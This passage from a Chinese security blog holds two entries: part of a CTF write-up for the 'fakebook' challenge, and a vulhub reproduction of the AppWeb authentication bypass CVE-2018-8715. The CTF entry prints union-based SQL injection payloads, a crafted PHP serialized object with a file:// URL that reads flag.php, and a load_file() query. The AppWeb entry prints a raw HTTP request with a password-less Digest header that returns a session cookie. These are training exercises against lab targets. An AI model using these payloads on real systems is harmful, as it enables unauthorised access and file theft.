<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
<h1 id="信息收集">信息收集</h1>
<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>（这里也说明，blog是有特殊的格式要求的。）</p>
<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
<h1 id="第二次sql注入">第二次sql注入</h1>
<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
<h1 id="其他注入方法">其他注入方法</h1>
<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>basic 传统HTTP基础认证</li>
<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>form 表单认证</li>
</ul>
<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
</ul>
<p>路径：</p>
<ul>
<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
</ul>
<p>启动环境：</p>
<ul>
<li><code>sudo docker-compose up -d</code></li>
<li>输入 <code>http://ip:8080</code> 即可访问</li>
</ul>
<p>前提：</p>
<ul>
<li>已知某个用户名为 <code>admin</code></li>
</ul>
<h1 id="复现">复现</h1>
<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>（最后两个空行很重要！）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
<ul>
<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
</ul>
<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
</search>
